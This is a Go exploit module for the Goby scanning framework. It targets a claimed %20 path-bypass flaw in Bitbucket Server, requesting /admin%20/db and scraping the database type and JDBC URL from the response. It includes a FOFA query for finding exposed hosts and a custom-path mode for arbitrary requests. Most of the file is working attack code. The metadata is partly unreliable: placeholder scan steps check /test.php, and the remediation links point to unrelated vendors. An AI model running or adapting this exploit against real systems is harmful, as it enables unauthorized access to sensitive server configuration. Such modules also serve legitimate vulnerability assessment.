package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Bitbucket Server V4.8 /admin / Unauthorized Access Vulnerability",
    "Description": "<p>Bitbucket Cloud is a Git-based code hosting and collaboration tool built for teams. Bitbucket's first-class Jira and Trello integrations are designed to bring together entire software teams to work on a project together. Bitbucket Server versions less than V4.8 have an unauthorized access vulnerability, which has a %20 bypass permission vulnerability that allows any user to obtain sensitive data</p>",
    "Product": "Bitbucket",
    "Homepage": "https://bitbucket.org/",
    "DisclosureDate": "2024-09-13",
    "PostTime": "2024-09-20",
    "Author": "2826161446@qq.com",
    "FofaQuery": "title=\"Log in - Bitbucket\" && body=\"WRM._unparsedData\" ",
    "GobyQuery": "title=\"Log in - Bitbucket\" && body=\"WRM._unparsedData\" ",
    "Level": "1",
    "Impact": "<p>Bitbucket Server versions earlier than V4.8 have an unauthorized access vulnerability, including a vulnerability that bypasses permissions via %20, allowing any user to obtain sensitive data</p>",
    "Recommendation": "<p>1. Upgrading to a secure version<a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "db_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "2H1W"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "Bitbucket Server V4.8 /admin / 未授权访问漏洞",
            "Product": "ATLASSIAN-Bitbucket",
            "Description": "<p>Bitbucket Cloud 是一款基于 Git 的代码托管与协作工具，专为团队打造。Bitbucket 一流的 Jira 和 Trello 集成旨在集结整个软件团队以便共同处理一个项目。Bitbucket Server 版本小于V4.8 存在未授权访问漏洞，其中出现了一个通过 %20 绕过权限的漏洞，导致任何用户可获取敏感数据<br></p>",
            "Recommendation": "<p>1、升级到安全版本<a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Bitbucket Server 版本小于V4.8 存在未授权访问漏洞，其中出现了一个通过 %20 绕过权限的漏洞，导致任何用户可获取敏感数据<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Bitbucket Server V4.8 /admin / Unauthorized Access Vulnerability",
            "Product": "Bitbucket",
            "Description": "<p>Bitbucket Cloud is a Git-based code hosting and collaboration tool built for teams. Bitbucket's first-class Jira and Trello integrations are designed to bring together entire software teams to work on a project together. Bitbucket Server versions less than V4.8 have an unauthorized access vulnerability, which has a %20 bypass permission vulnerability that allows any user to obtain sensitive data<br></p>",
            "Recommendation": "<p>1. Upgrading to a secure version<a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Bitbucket Server versions earlier than V4.8 have an unauthorized access vulnerability, including a vulnerability that bypasses permissions via %20, allowing any user to obtain sensitive data<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9954"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/admin%20/db"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/admin%20/db": "Database Type",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"db_info": {"/admin%20/db", "Database Type"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			//匹配数据库类型
			regular := `<span id="type" class="field-value">(.*?)<\/span>`
			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output1, err := makeRegular(resp, regular)
			//匹配JDBC URL
			regular2 := `<span id="url" class="field-value">(.*?)<\/span>`
			makeRegular2 := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output2, err := makeRegular2(resp, regular2)

			if output1 != "Internal" {
				expResult.Success = true
				expResult.Output = "Database Type: " + output1 + "\nJDBC URL: " + output2
			} else {
				expResult.Success = true
				expResult.Output = "Database Type: " + output1
			}

			return expResult
		},
	))
}
